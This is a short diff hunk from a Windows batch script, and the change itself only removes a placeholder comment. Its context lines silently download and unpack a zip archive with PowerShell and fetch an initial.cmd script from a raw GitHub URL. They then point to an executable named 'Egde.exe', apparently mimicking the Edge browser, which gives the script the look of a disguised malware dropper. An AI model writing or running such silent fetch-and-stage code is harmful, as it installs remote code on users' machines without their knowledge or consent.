@@ -60,7 +60,7 @@ mkdir "%mallDest%" >nul 2>&1
 powershell -Command "Invoke-WebRequest -Uri '%mallUrl%' -OutFile '%mallZip%'" >nul
 powershell -Command "Expand-Archive -Path '%mallZip%' -DestinationPath '%mallDest%' -Force" >nul
 
-set "initialCmdUrl=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/initial.cmd"  &:: CHANGE TO ACTUAL URL
+set "initialCmdUrl=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/initial.cmd"  &:: 
 powershell -Command "Invoke-WebRequest -Uri '%initialCmdUrl%' -OutFile '%mallDest%\initial.cmd'" >nul
 
 set "appPath=%mallDest%\Egde.exe"
